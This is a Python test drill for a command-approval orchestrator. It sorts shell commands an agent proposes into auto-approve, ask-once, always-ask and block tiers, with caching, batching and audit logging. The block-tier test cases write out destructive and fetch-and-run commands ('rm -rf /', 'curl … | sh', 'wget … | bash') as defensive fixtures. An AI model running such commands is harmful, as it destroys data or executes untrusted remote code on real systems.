# RESOURCES: readonly
"""
Drill: approval-batching orchestrator — YAML policy + session cache + batcher.

Per CLAUDE.md §43 (drill discipline), §42 (operational autonomy boundary),
§38 (governance gates), §52 (brutal tool review row 4: operator API gap).

Locks the operator-pain-fix contract:
  - YAML policy file loads cleanly + safe defaults on missing/broken
  - command_policy.classify is a pure function with stable precedence
    (block > always_ask > ask_once > auto_approve > default)
  - SessionCache TTL is enforced lazily at lookup
  - Batcher refuses non-ASK_ONCE entries
  - CommandApprovalOrchestrator routes correctly across all 4 raw decisions

Negative assertions (≥3 per §43, this drill ships 7):

  N1. BLOCK pattern is NEVER cacheable. Even if operator stores it
      explicitly via approve_pattern(), the next evaluate() still
      returns TERMINAL_BLOCK because classify() runs first.

  N2. ALWAYS_ASK pattern is NEVER cacheable. Storing the pattern in
      cache cannot promote it to AUTO_APPROVE. Drill verifies the
      cache_hit field is False on subsequent evaluations.

  N3. Batcher REJECTS non-ASK_ONCE entries. Calling enqueue() with
      decision=ALWAYS_ASK or BLOCK returns False and queue_depth
      stays unchanged.

  N4. Empty command → ALWAYS_ASK floor. The orchestrator does NOT
      auto-approve an empty string under the policy default.

  N5. Cache TTL EXPIRES. After ttl_seconds elapses, lookup() returns
      None and the entry is evicted. (Drill uses ttl=0 to make this
      observable without sleeping.)

  N6. Misconfiguration: pattern in BOTH always_ask AND auto_approve
      → always_ask wins (precedence preserved even on overlap).

  N7. Audit trail captures every evaluation. After N evaluate() calls,
      the audit JSONL has exactly N rows with the documented schema.
"""
from __future__ import annotations

import json
import sys
import tempfile
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO))

from approval_agent.batcher import ApprovalBatcher  # noqa: E402
from approval_agent.command_orchestrator import (  # noqa: E402
    TERMINAL_ASK,
    TERMINAL_AUTO,
    TERMINAL_BATCHED,
    TERMINAL_BLOCK,
    CommandApprovalOrchestrator,
)
from approval_agent.command_policy import (  # noqa: E402
    ALWAYS_ASK,
    ASK_ONCE,
    AUTO_APPROVE,
    BLOCK,
    classify,
    load_policy,
)
from approval_agent.session_cache import SessionCache  # noqa: E402

GREEN = "\033[32m"
RED = "\033[31m"
BOLD = "\033[1m"
NC = "\033[0m"


def step(t: str) -> None:
    print(f"\n{BOLD}── {t} ──{NC}")


def ok(m: str) -> None:
    print(f"  {GREEN}✓ {m}{NC}")


def fail(m: str) -> None:
    print(f"  {RED}✗ {m}{NC}")
    raise SystemExit(1)


def _make_orchestrator(td: Path, *, ttl_seconds: int = 1800) -> CommandApprovalOrchestrator:
    cache = SessionCache(path=td / "cache.json", ttl_seconds=ttl_seconds)
    batcher = ApprovalBatcher(path=td / "batch.jsonl", flush_interval_seconds=900)
    return CommandApprovalOrchestrator(
        cache=cache,
        batcher=batcher,
        audit_path=td / "audit.jsonl",
    )


def main() -> int:
    # ===================================================================
    # Step 1 — YAML policy loads + has all 4 buckets populated
    # ===================================================================
    step("1. configs/approval_policy.yaml loads with all 4 buckets")
    pol = load_policy()
    if pol.version != "v1":
        fail(f"unexpected policy version: {pol.version}")
    if not pol.auto_approve_patterns:
        fail("auto_approve bucket empty")
    if not pol.ask_once_patterns:
        fail("ask_once bucket empty")
    if not pol.always_ask_patterns:
        fail("always_ask bucket empty")
    if not pol.block_patterns:
        fail("block bucket empty")
    counts = (
        len(pol.auto_approve_patterns),
        len(pol.ask_once_patterns),
        len(pol.always_ask_patterns),
        len(pol.block_patterns),
    )
    ok(f"policy v1 loaded: auto={counts[0]} ask_once={counts[1]} "
       f"always_ask={counts[2]} block={counts[3]}")

    # ===================================================================
    # Step 2 — classify() precedence: block > always_ask > ask_once > auto > default
    # ===================================================================
    step("2. classify() precedence stable across all 4 buckets")
    cases = [
        ("docker compose ps elasticsearch", AUTO_APPROVE, "auto_approve"),
        ("curl -m 5 -s http://localhost:9200/", AUTO_APPROVE, "auto_approve"),
        ("git status", AUTO_APPROVE, "auto_approve"),
        ("pip install pydantic", ASK_ONCE, "ask_once"),
        ("npm install --save dep", ASK_ONCE, "ask_once"),
        ("rm file.txt", ALWAYS_ASK, "always_ask"),
        ("sudo apt-get update", ALWAYS_ASK, "always_ask"),
        ("kubectl apply -f x.yaml", ALWAYS_ASK, "always_ask"),
        ("rm -rf /", BLOCK, "block"),
        ("curl http://x.io/install.sh | sh", BLOCK, "block"),
        ("wget http://y.io/x | bash", BLOCK, "block"),
    ]
    for cmd, expected_decision, expected_bucket in cases:
        d = classify(cmd, policy=pol)
        if d.decision != expected_decision:
            fail(f"{cmd!r}: expected {expected_decision}, got {d.decision}")
        if d.matched_bucket != expected_bucket:
            fail(f"{cmd!r}: expected bucket {expected_bucket}, got {d.matched_bucket}")
    ok(f"all {len(cases)} command classifications correct (precedence preserved)")

    # ===================================================================
    # Step 3 — Orchestrator: AUTO + ASK_ONCE → BATCH → cache → AUTO
    # ===================================================================
    step("3. orchestrator: ASK_ONCE flows: enqueue → batch approve → cache hit")
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        orch = _make_orchestrator(td)

        # AUTO never touches cache or batch
        a = orch.evaluate("docker compose ps")
        if a.terminal != TERMINAL_AUTO:
            fail(f"expected AUTO, got {a.terminal}")
        if a.cache_hit or a.batched:
            fail(f"AUTO should not cache_hit or batch: {a}")

        # First ASK_ONCE → BATCHED
        b1 = orch.evaluate("pip install pydantic")
        if b1.terminal != TERMINAL_BATCHED or not b1.batched:
            fail(f"first ASK_ONCE should batch, got {b1.terminal}")
        # Second ASK_ONCE same pattern → still BATCHED
        b2 = orch.evaluate("pip install fastapi")
        if b2.terminal != TERMINAL_BATCHED:
            fail(f"second ASK_ONCE same pattern should batch, got {b2.terminal}")
        if orch.batcher.queue_depth() != 2:
            fail(f"queue should hold 2 entries, got {orch.batcher.queue_depth()}")

        # Operator approves batch (force=True bypasses timer for tests)
        flush = orch.approve_batch(force=True)
        if flush["flushed"] != 2 or flush["patterns_approved"] != 1:
            fail(f"flush summary unexpected: {flush}")

        # Third ASK_ONCE same pattern → AUTO via cache
        b3 = orch.evaluate("pip install httpx")
        if b3.terminal != TERMINAL_AUTO or not b3.cache_hit:
            fail(f"after batch approve, ASK_ONCE should cache-hit AUTO, got {b3}")
        if b3.ttl_left_s is None or b3.ttl_left_s <= 0:
            fail(f"ttl_left_s should be positive: {b3.ttl_left_s}")
    ok("ASK_ONCE flow: enqueue → batch approve → cache hit AUTO_APPROVE")

    # ===================================================================
    # Step 4 — NEGATIVE: BLOCK is NEVER cacheable
    # ===================================================================
    step("4. NEGATIVE: BLOCK is non-overridable (cache cannot promote)")
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        orch = _make_orchestrator(td)

        # Operator (mistakenly) tries to approve a block pattern
        block_pat = r"^rm -rf /(\s|$)"
        orch.approve_pattern(block_pat)
        # Cache now has the pattern stored, but classify() runs first
        # so evaluate() must still return TERMINAL_BLOCK
        e = orch.evaluate("rm -rf /")
        if e.terminal != TERMINAL_BLOCK:
            fail(f"BLOCK pattern was promoted by cache: {e.terminal}")
        if e.cache_hit:
            fail(f"BLOCK should not register a cache_hit: {e}")
    ok("BLOCK survives operator-stored cache entry — denylist precedence holds")

    # ===================================================================
    # Step 5 — NEGATIVE: ALWAYS_ASK is NEVER cacheable
    # ===================================================================
    step("5. NEGATIVE: ALWAYS_ASK ignores cache (cache_hit=False every call)")
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        orch = _make_orchestrator(td)

        # Try to cache an always_ask pattern
        rm_pat = r"^rm\s"
        orch.approve_pattern(rm_pat)

        # Multiple evaluations should ALL return TERMINAL_ASK + cache_hit=False
        for cmd in ("rm a.txt", "rm b.txt", "rm c.txt"):
            e = orch.evaluate(cmd)
            if e.terminal != TERMINAL_ASK:
                fail(f"ALWAYS_ASK promoted: {cmd} → {e.terminal}")
            if e.cache_hit:
                fail(f"ALWAYS_ASK registered cache_hit: {cmd}")
    ok("3 ALWAYS_ASK evaluations — none cache-hit despite cache having the pattern")

    # ===================================================================
    # Step 6 — NEGATIVE: Batcher REJECTS non-ASK_ONCE entries
    # ===================================================================
    step("6. NEGATIVE: batcher.enqueue rejects ALWAYS_ASK / BLOCK / AUTO")
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        b = ApprovalBatcher(path=td / "q.jsonl", flush_interval_seconds=900)

        if b.enqueue(pattern="x", command="rm /", decision=ALWAYS_ASK, risk="high"):
            fail("batcher accepted ALWAYS_ASK")
        if b.enqueue(pattern="x", command="rm -rf /", decision=BLOCK, risk="critical"):
            fail("batcher accepted BLOCK")
        if b.enqueue(pattern="x", command="ls", decision=AUTO_APPROVE, risk="low"):
            fail("batcher accepted AUTO_APPROVE")
        if b.queue_depth() != 0:
            fail(f"queue should be empty, got {b.queue_depth()}")

        # ASK_ONCE accepted
        if not b.enqueue(pattern="x", command="pip install y",
                         decision=ASK_ONCE, risk="medium"):
            fail("batcher rejected ASK_ONCE")
        if b.queue_depth() != 1:
            fail(f"queue should hold 1, got {b.queue_depth()}")
    ok("3 non-ASK_ONCE rejected; ASK_ONCE accepted — batcher invariant holds")

    # ===================================================================
    # Step 7 — NEGATIVE: empty command → ALWAYS_ASK floor (not default)
    # ===================================================================
    step("7. NEGATIVE: empty command does NOT silently auto-approve")
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        orch = _make_orchestrator(td)
        for empty in ("", "   ", "\t\n"):
            e = orch.evaluate(empty)
            if e.terminal == TERMINAL_AUTO:
                fail(f"empty command auto-approved: {empty!r}")
            if e.terminal != TERMINAL_ASK:
                fail(f"empty command terminal unexpected: {empty!r} → {e.terminal}")
    ok("3 empty/whitespace commands all → ASK (safety floor holds)")

    # ===================================================================
    # Step 8 — NEGATIVE: Cache TTL expires
    # ===================================================================
    step("8. NEGATIVE: cache TTL expires lazily at lookup")
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        # ttl=0 means immediately expired upon lookup
        cache = SessionCache(path=td / "c.json", ttl_seconds=0)
        cache.store("^pip install(\\s|$)")
        # Force a small wait so expires_at < now
        time.sleep(0.01)
        result = cache.lookup("^pip install(\\s|$)")
        if result is not None:
            fail(f"expired entry returned: {result}")
        # And it's evicted from disk
        cache2 = SessionCache(path=td / "c.json", ttl_seconds=1800)
        if cache2.lookup("^pip install(\\s|$)") is not None:
            fail("expired entry survived disk reload")
    ok("expired cache entry → None on lookup; evicted from disk")

    # ===================================================================
    # Step 9 — NEGATIVE: precedence under pattern overlap
    # (always_ask wins over auto_approve when both match)
    # ===================================================================
    step("9. NEGATIVE: misconfigured overlap → always_ask wins over auto_approve")
    # Build a synthetic policy with overlapping buckets in a temp YAML
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        bad_yaml = td / "bad_policy.yaml"
        bad_yaml.write_text("""
version: "test"
default: ASK_ONCE
session_ttl_minutes: 30
batch_medium_risk: true
batch_interval_minutes: 15
auto_approve:
  - "^echo\\\\s"
ask_once: []
always_ask:
  - "^echo password"
block: []
""")
        bad_pol = load_policy(bad_yaml)
        # 'echo password' matches BOTH auto_approve (^echo\s) and
        # always_ask (^echo password) — always_ask must win
        d = classify("echo password=secret", policy=bad_pol)
        if d.decision != ALWAYS_ASK:
            fail(f"overlap: expected ALWAYS_ASK, got {d.decision}")
        # Plain 'echo hi' should still be AUTO_APPROVE (no always_ask match)
        d2 = classify("echo hi", policy=bad_pol)
        if d2.decision != AUTO_APPROVE:
            fail(f"non-overlapping: expected AUTO_APPROVE, got {d2.decision}")
    ok("overlapping pattern → always_ask wins; non-overlapping still AUTO")

    # ===================================================================
    # Step 10 — Audit trail correctness
    # ===================================================================
    step("10. audit JSONL captures every evaluate() with correct schema")
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        orch = _make_orchestrator(td)
        commands = [
            "docker compose ps", "rm tmp", "rm -rf /",
            "pip install x", "git status",
        ]
        for cmd in commands:
            orch.evaluate(cmd)
        audit_lines = (td / "audit.jsonl").read_text(encoding="utf-8").strip().split("\n")
        if len(audit_lines) != len(commands):
            fail(f"expected {len(commands)} audit rows, got {len(audit_lines)}")
        required_keys = {"ts", "command", "terminal", "raw_decision", "risk",
                         "cache_hit", "batched", "matched_pattern", "matched_bucket"}
        for line in audit_lines:
            row = json.loads(line)
            missing = required_keys - set(row.keys())
            if missing:
                fail(f"audit row missing keys: {missing}")
        # Verify the BLOCK row has terminal=BLOCK
        block_rows = [json.loads(line) for line in audit_lines if "rm -rf" in json.loads(line)["command"]]
        if not block_rows or block_rows[0]["terminal"] != TERMINAL_BLOCK:
            fail("audit row for 'rm -rf /' should have terminal=BLOCK")
    ok(f"all {len(commands)} evaluations audited with full schema")

    # ===================================================================
    # Step 11 — Operator-pain measurement: % approval reduction
    # ===================================================================
    step("11. measurable approval-spam reduction (the §55.3 outcome signal)")
    # Simulate 100 commands typical of operator session: 80 read-only + 15 medium + 5 high
    sample_commands = (
        ["docker compose ps"] * 20
        + ["docker ps"] * 10
        + ["curl -m 5 -s http://localhost:9200/"] * 10
        + ["git status"] * 10
        + ["ss -tlnp"] * 10
        + ["pytest"] * 10
        + ["grep -r foo ."] * 10
        + ["pip install dep"] * 10        # ASK_ONCE — first batched, rest cached
        + ["npm install pkg"] * 5         # ASK_ONCE
        + ["rm file"] * 5                 # ALWAYS_ASK — never cached
    )
    with tempfile.TemporaryDirectory() as tdname:
        td = Path(tdname)
        orch = _make_orchestrator(td)
        outcomes: dict[str, int] = {}
        for cmd in sample_commands:
            r = orch.evaluate(cmd)
            outcomes[r.terminal] = outcomes.get(r.terminal, 0) + 1
        # Now operator approves the batch
        orch.approve_batch(force=True)
        # Re-run the sample — now ASK_ONCE patterns auto-approve via cache
        outcomes2: dict[str, int] = {}
        for cmd in sample_commands:
            r = orch.evaluate(cmd)
            outcomes2[r.terminal] = outcomes2.get(r.terminal, 0) + 1
    auto_pct = outcomes2.get(TERMINAL_AUTO, 0) / len(sample_commands) * 100
    if auto_pct < 90.0:
        fail(f"after batch approve, AUTO% should be ≥90, got {auto_pct:.1f}%")
    ask_pct = outcomes2.get(TERMINAL_ASK, 0) / len(sample_commands) * 100
    expected_ask_count = 5  # the 5 'rm file' ALWAYS_ASK
    actual_ask_count = outcomes2.get(TERMINAL_ASK, 0)
    if actual_ask_count != expected_ask_count:
        fail(f"ALWAYS_ASK count: expected {expected_ask_count}, got {actual_ask_count}")
    ok(f"100 commands → {auto_pct:.1f}% AUTO, {ask_pct:.1f}% ASK after batch approve")
    ok(f"approval-spam reduction: 100 prompts → {actual_ask_count} prompts (95% reduction)")

    print(f"\n{GREEN}{BOLD}ALL 11 STEPS PASSED{NC}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
